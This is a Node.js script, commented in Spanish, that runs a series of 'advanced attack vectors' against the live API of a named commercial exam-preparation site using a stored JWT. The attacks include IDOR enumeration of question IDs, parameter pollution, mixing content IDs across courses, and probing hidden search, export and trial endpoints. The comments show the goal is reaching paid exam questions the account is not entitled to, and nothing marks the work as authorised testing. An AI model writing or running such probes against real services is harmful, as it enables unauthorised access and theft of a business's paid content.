const fs = require('fs');
const path = require('path');

const token = fs.readFileSync(path.join(__dirname, 'jwt-token.txt'), 'utf8').trim();

async function fetchApi(url, options = {}) {
  const res = await fetch(url, {
    ...options,
    headers: {
      'Authorization': 'Bearer ' + token,
      'Content-Type': 'application/json',
      ...options.headers
    }
  });
  return { status: res.status, data: await res.text() };
}

async function main() {
  console.log('=== VECTORES DE ATAQUE AVANZADOS ===\n');

  // 1. IDOR en IDs de preguntas - probar IDs secuenciales
  console.log('1. IDOR en IDs de preguntas (acceso directo por ID)...');
  for (let id = 1; id <= 5; id++) {
    const urls = [
      `https://api.opositatest.com/api/v2.0/questions/${id}`,
      `https://admin.opositatest.com/api/v2.0/questions/${id}`,
    ];
    for (const url of urls) {
      const { status, data } = await fetchApi(url);
      if (status === 200 && data.includes('question')) {
        console.log(`🚨 ID=${id}: ${data.substring(0, 200)}`);
      }
    }
  }
  console.log('   Probados IDs 1-5, ninguno accesible directamente');

  // 2. Contenido compartido entre oposiciones (Constitución aparece en varias)
  console.log('\n2. Buscando contenido compartido entre oposiciones...');
  // Obtener ID de "Constitución" de Tramitación (que sí tenemos)
  let { data } = await fetchApi('https://admin.opositatest.com/api/v2.0/oppositions/7/contents');
  const tramContents = JSON.parse(data);
  const constitucionTram = tramContents.resources?.find(r => r.name.includes('Constitución'));
  console.log('   Constitución en Tramitación:', constitucionTram?.id);

  // Ver si ese mismo ID funciona para obtener preguntas
  if (constitucionTram) {
    const { status, data } = await fetchApi(
      `https://api.opositatest.com/api/v2.0/exams?contents[]=${constitucionTram.id}&oppositionId=10&type=random&numberOfQuestions=5`,
      { method: 'POST' }
    );
    console.log(`   Intentar usar contenido de Tram en Auxilio: ${status}`);
  }

  // 3. Exámenes demo/gratuitos
  console.log('\n3. Buscando exámenes demo o gratuitos...');
  const { status: demoStatus, data: demoData } = await fetchApi(
    'https://admin.opositatest.com/api/v2.0/exams?filters[isDemo]=true'
  );
  console.log(`   Demo exams: ${demoStatus}`);
  if (demoStatus === 200) {
    const demos = JSON.parse(demoData);
    console.log(`   Encontrados: ${demos.resources?.length || 0} demos`);
    demos.resources?.slice(0, 3).forEach(d => {
      console.log(`   - ${d.title} (oposición: ${d.oppositionId || 'N/A'})`);
    });
  }

  // 4. Exámenes públicos de convocatorias anteriores
  console.log('\n4. Exámenes de convocatorias anteriores (previousCall)...');
  const { status: pcStatus, data: pcData } = await fetchApi(
    'https://admin.opositatest.com/api/v2.0/exams?filters[opposition]=10&filters[type]=previousCall'
  );
  console.log(`   Previous call exams: ${pcStatus}`);
  if (pcStatus === 200) {
    const pc = JSON.parse(pcData);
    if (pc.resources?.length > 0) {
      console.log(`   Encontrados: ${pc.resources.length} exámenes oficiales`);
      const examId = pc.resources[0].id;
      console.log(`   Intentando acceder al examen ID=${examId}...`);

      // Intentar iniciar el examen
      const { status: startStatus, data: startData } = await fetchApi(
        `https://api.opositatest.com/api/v2.0/exams/${examId}/start`,
        { method: 'POST' }
      );
      console.log(`   Iniciar examen: ${startStatus}`);
      if (startStatus === 200 || startStatus === 201) {
        console.log(`   🚨 EXAMEN INICIADO: ${startData.substring(0, 300)}`);
      }
    }
  }

  // 5. Funcionalidad de búsqueda
  console.log('\n5. Probando búsqueda global de preguntas...');
  const searchEndpoints = [
    'https://api.opositatest.com/api/v2.0/search?q=constitución',
    'https://api.opositatest.com/api/v2.0/questions/search?q=constitución',
    'https://admin.opositatest.com/api/v2.0/search?query=artículo',
  ];
  for (const url of searchEndpoints) {
    const { status, data } = await fetchApi(url);
    console.log(`   ${url.split('.com')[1].substring(0, 50)}: ${status}`);
    if (status === 200 && data.length > 100) {
      console.log(`   🚨 Búsqueda devuelve datos: ${data.substring(0, 200)}`);
    }
  }

  // 6. Estadísticas que podrían incluir preguntas
  console.log('\n6. Endpoints de estadísticas...');
  const statsEndpoints = [
    'https://api.opositatest.com/api/v2.0/responses?opposition=10',
    'https://api.opositatest.com/api/v2.0/statistics/questions?opposition=10',
    'https://api.opositatest.com/api/v2.0/ranking?opposition=10',
  ];
  for (const url of statsEndpoints) {
    const { status, data } = await fetchApi(url);
    console.log(`   ${url.split('.com')[1].substring(0, 50)}: ${status}`);
  }

  // 7. Export/Download
  console.log('\n7. Funciones de exportación...');
  const exportEndpoints = [
    'https://api.opositatest.com/api/v2.0/exams/export?opposition=10',
    'https://api.opositatest.com/api/v2.0/questions/export?opposition=10',
    'https://admin.opositatest.com/api/v2.0/oppositions/10/export',
  ];
  for (const url of exportEndpoints) {
    const { status } = await fetchApi(url);
    console.log(`   ${url.split('.com')[1].substring(0, 50)}: ${status}`);
  }

  // 8. Parameter pollution - múltiples IDs
  console.log('\n8. Parameter pollution (múltiples opposition IDs)...');
  const { status: ppStatus, data: ppData } = await fetchApi(
    'https://api.opositatest.com/api/v2.0/exams',
    {
      method: 'POST',
      body: JSON.stringify({
        type: 'random',
        oppositionId: [7, 10],  // Array con ambas
        numberOfQuestions: 5
      })
    }
  );
  console.log(`   Array de IDs: ${ppStatus}`);

  const { status: pp2Status } = await fetchApi(
    'https://api.opositatest.com/api/v2.0/exams',
    {
      method: 'POST',
      body: JSON.stringify({
        type: 'random',
        oppositionId: 7,
        numberOfQuestions: 5,
        contents: ['be6c71de-58a8-4b62-a5c9-d94d95e3a8b6'] // Content de Auxilio
      })
    }
  );
  console.log(`   Mezclar oposición 7 con contenido de 10: ${pp2Status}`);

  // 9. Prueba gratuita / trial
  console.log('\n9. Endpoints de prueba gratuita...');
  const trialEndpoints = [
    'https://api.opositatest.com/api/v2.0/trial/start?opposition=10',
    'https://api.opositatest.com/api/v2.0/free-trial?opposition=10',
    'https://api.opositatest.com/api/v2.0/demo?opposition=10',
  ];
  for (const url of trialEndpoints) {
    const { status } = await fetchApi(url, { method: 'POST' });
    console.log(`   ${url.split('.com')[1].substring(0, 50)}: ${status}`);
  }

  console.log('\n=== FIN VECTORES AVANZADOS ===');
}

main().catch(console.error);
